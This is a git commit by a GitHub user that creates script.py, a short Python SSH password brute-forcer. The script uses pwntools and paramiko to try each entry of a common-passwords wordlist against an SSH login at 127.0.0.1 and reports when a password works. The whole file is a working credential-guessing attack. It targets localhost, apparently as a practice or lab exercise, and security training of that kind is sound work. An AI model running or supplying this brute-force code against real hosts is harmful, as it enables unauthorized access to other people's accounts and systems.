2727be31fae557b459dd73fd1a98d35451781137
MADHAV <86304571+Madhav-Sai@users.noreply.github.com>
2023-07-07 15:38:51 +0530

    Create script.py

---
+++ script.py
@@ -0,0 +1,24 @@
+from pwn import *
+import paramiko
+
+host = "127.0.0.1"
+username = "not root"
+attempts = 0
+
+with open("ssh-common-passwords.txt", "r") as password_list:
+    for password in password_list:
+        password = password.strip()
+        try:
+            print("Attempting password: '{}'".format(password))
+            response = ssh(host=host, user=username, password=password, timeout=1)
+            
+            if response.connected:
+                print("Valid password found: '{}'".format(password))
+                response.close()
+                break
+            
+            response.close()
+        
+        except paramiko.ssh_exception.AuthenticationException:
+            print("[X] Invalid password!")
+            attempts += 1
